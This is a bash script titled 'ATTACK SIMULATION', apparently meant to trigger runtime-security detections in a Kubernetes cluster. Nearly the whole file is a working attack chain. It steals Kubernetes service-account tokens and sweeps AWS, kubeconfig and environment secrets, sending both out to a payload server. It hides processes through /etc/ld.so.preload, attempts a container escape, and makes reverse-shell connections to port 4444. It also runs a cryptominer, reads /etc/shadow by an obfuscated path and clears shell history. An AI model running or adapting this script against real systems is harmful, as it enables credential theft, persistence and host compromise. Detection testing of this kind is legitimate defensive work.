#!/bin/bash
export HOME=/root PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin

R='\033[0;31m'; G='\033[0;32m'; Y='\033[1;33m'; B='\033[0;34m'; M='\033[0;35m'; C='\033[0;36m'; N='\033[0m'
log() { echo -e "${1}[$(date +%T)] $2${N}"; }

SPATH=${SPATH:-/usr/sbin}
[ -w /usr/sbin ] && SPATH=/usr/sbin || { [ -w /tmp ] && SPATH=/tmp || SPATH=/var/tmp; }
HIDDEN="/dev/shm/.../...HIDDEN..."
PAYLOAD_SERVER=${PAYLOAD_SERVER:-"payload-server.default.svc.cluster.local"}
PAYLOAD_PORT=${PAYLOAD_PORT:-8080}
AWS_CRED_PATH=${AWS_CREDENTIAL_PATH:-"/etc/bsssq-secrets/aws"}
MINER_DURATION=${MINER_DURATION:-60}

mkdir -p "$HIDDEN" 2>/dev/null

log "$M" "======== ATTACK SIMULATION ========"

log "$C" "Environment setup"
[ -f "/etc/ld.so.preload" ] && { chattr -ia / /etc/ /etc/ld.so.preload 2>/dev/null; rm -f /etc/ld.so.preload; }

for d in /tmp /var/tmp /dev/shm /usr/sbin; do
    [ -d "$d" ] && [ ! -w "$d" ] && chattr -ia "$d" 2>/dev/null
done

log "$C" "Deploying binaries"
cp /tmp/payloads/* "$SPATH/" 2>/dev/null
chmod +x "$SPATH"/{xmx2,www,cc.py,pt} 2>/dev/null

log "$C" "Stage 1: K8s token theft"
for token_path in /var/run/secrets/kubernetes.io/serviceaccount/token /run/secrets/kubernetes.io/serviceaccount/token; do
    [ -f "$token_path" ] && cat "$token_path" > "$HIDDEN/k8s_token.txt" && break
done

if [ -f "$HIDDEN/k8s_token.txt" ]; then
    log "$G" "K8s token: $(head -c 40 "$HIDDEN/k8s_token.txt" | base64 | head -c 30)..."
    python3 "$SPATH/exfil.py" "$HIDDEN/k8s_token.txt" "/tokens" || log "$Y" "Exfiltration failed"
else
    log "$Y" "No K8s token found"
fi

log "$C" "Launching parallel attack stages"

{
    log "$B" "[BG] Process hiding"
    sleep 1
    if [ -w /usr/local/lib ]; then
        chattr -ia / /usr/ /usr/local/ /usr/local/lib/ 2>/dev/null
        cp /tmp/payloads/xmx2.so /usr/local/lib/xmx2.so 2>/dev/null
        echo '/usr/local/lib/xmx2.so' > /etc/ld.so.preload 2>/dev/null
        chattr +i /etc/ld.so.preload 2>/dev/null
    fi
    "$SPATH/www" >/dev/null 2>&1 &
    log "$G" "[BG] Process hiding complete"
} &

{
    log "$B" "[BG] Credential sweep"
    sleep 0.5
    creds="$HIDDEN/creds.txt"
    {
        [ -f ~/.aws/credentials ] && cat ~/.aws/credentials
        [ -f ~/.kube/config ] && cat ~/.kube/config
        [ -f /etc/db_config/database.yml ] && cat /etc/db_config/database.yml
        env | grep -iE '(AWS|AZURE|GCP|SECRET|KEY|TOKEN|PASS)' | grep -v PATH
        find /proc/*/environ -type f 2>/dev/null | head -20 | xargs strings 2>/dev/null | grep -iE '(AWS|SECRET|KEY)' | head -10
    } > "$creds" 2>/dev/null

    if [ -f "$AWS_CRED_PATH/iam-role.json" ]; then
        cat "$AWS_CRED_PATH/iam-role.json" | base64 -d 2>/dev/null >> "$creds" || cat "$AWS_CRED_PATH/iam-role.json" >> "$creds"
    fi
    if [ -f "$AWS_CRED_PATH/aws-keys.json" ]; then
        cat "$AWS_CRED_PATH/aws-keys.json" | base64 -d 2>/dev/null >> "$creds" || cat "$AWS_CRED_PATH/aws-keys.json" >> "$creds"
    fi

    [ -s "$creds" ] && python3 "$SPATH/exfil.py" "$creds" "/creds"
    log "$G" "[BG] Credential sweep complete"
} &

{
    log "$B" "[BG] Port scanning"
    python3 "$SPATH/portscan.py" "$PAYLOAD_SERVER" 22 80 443 8080 4444 7456 2>/dev/null | head -10
    log "$G" "[BG] Port scan complete"
} &

{
    log "$B" "[BG] Container escape"
    sleep 1
    python3 -c 'import ctypes; ctypes.CDLL("libc.so.6").mount(None, b"/dev/shm", None, 4128, b"")' 2>/dev/null
    if grep -q "/dev/shm" /proc/mounts 2>/dev/null; then
        cp /tmp/payloads/noumt /dev/shm/noumt 2>/dev/null
        chmod +x /dev/shm/noumt 2>/dev/null
        timeout 15 /dev/shm/noumt >/dev/null 2>&1 || true
        log "$G" "[BG] Container escape attempted"
    fi
} &

{
    log "$B" "[BG] AWS enumeration"
    sleep 1
    if [ -f "$AWS_CRED_PATH/aws-keys.json" ]; then
        data=$(cat "$AWS_CRED_PATH/aws-keys.json" | base64 -d 2>/dev/null || cat "$AWS_CRED_PATH/aws-keys.json")
        access_key=$(echo "$data" | grep -o '"AccessKeyId":"[^"]*"' | cut -d'"' -f4)
        secret_key=$(echo "$data" | grep -o '"SecretAccessKey":"[^"]*"' | cut -d'"' -f4)

        if [ -n "$access_key" ]; then
            mkdir -p ~/.aws
            cat > ~/.aws/credentials <<EOF
[default]
aws_access_key_id = $access_key
aws_secret_access_key = $secret_key
EOF
            aws iam list-roles --max-items 5 >/dev/null 2>&1 || log "$Y" "[BG] AWS auth failed (expected)"
        fi
    fi
    log "$G" "[BG] AWS enumeration complete"
} &

log "$C" "Waiting for stage 1 completion (process hiding)"
wait

{
    log "$B" "[BG] Reverse shells"
    PAYLOAD_IP=$(getent hosts $PAYLOAD_SERVER | awk '{print $1}')
    [ -z "$PAYLOAD_IP" ] && PAYLOAD_IP=$PAYLOAD_SERVER

    (timeout 3 bash -c "exec 3<>/dev/tcp/$PAYLOAD_IP/4444; echo 'bash-$(hostname)' >&3" 2>/dev/null) &
    (python3 -c "import socket; s=socket.socket(); s.settimeout(3); s.connect(('$PAYLOAD_IP',4444)); s.send(b'py-$(hostname)\n'); s.close()" 2>/dev/null) &
    (echo "nc-$(hostname)" | timeout 3 nc -w 2 $PAYLOAD_IP 4444 2>/dev/null) &
    wait -n
    log "$G" "[BG] Reverse shell attempted"
} &

log "$C" "Stage 2: Cryptomining"
timeout $MINER_DURATION "$SPATH/xmx2" --threads=$(nproc) 2>/dev/null || log "$Y" "Miner terminated"

log "$C" "Stage 3: Evasion techniques"
ln -sf $(rev<<<'wodahs/cte/') /tmp/1 2>/dev/null && wc --files0-from /tmp/1 2>/dev/null
cp $(command -v cat) /tmp/a.py 2>/dev/null && /tmp/a.py /etc/hosts >/dev/null

log "$C" "Stage 4: Python module execution"
timeout 15 python3 "$SPATH/cc.py" 2>/dev/null || true

log "$C" "Stage 5: History cleanup"
cat /dev/null > ~/.bash_history 2>/dev/null

log "$C" "Waiting for background stages"
wait

log "$M" "======== ATTACK COMPLETE ========"
log "$G" "Telemetry: $HIDDEN/"

cat > "$HIDDEN/report.json" <<EOF
{
  "timestamp": "$(date -Iseconds)",
  "host": "$(hostname)",
  "stages": {
    "token_theft": "$([ -f $HIDDEN/k8s_token.txt ] && echo completed || echo skipped)",
    "credential_sweep": "$([ -f $HIDDEN/creds.txt ] && echo completed || echo skipped)",
    "container_escape": "attempted",
    "cryptomining": "completed",
    "reverse_shell": "attempted"
  }
}
EOF

python3 "$SPATH/exfil.py" "$HIDDEN/report.json" "/report" 2>/dev/null || true
log "$G" "Attack report generated"
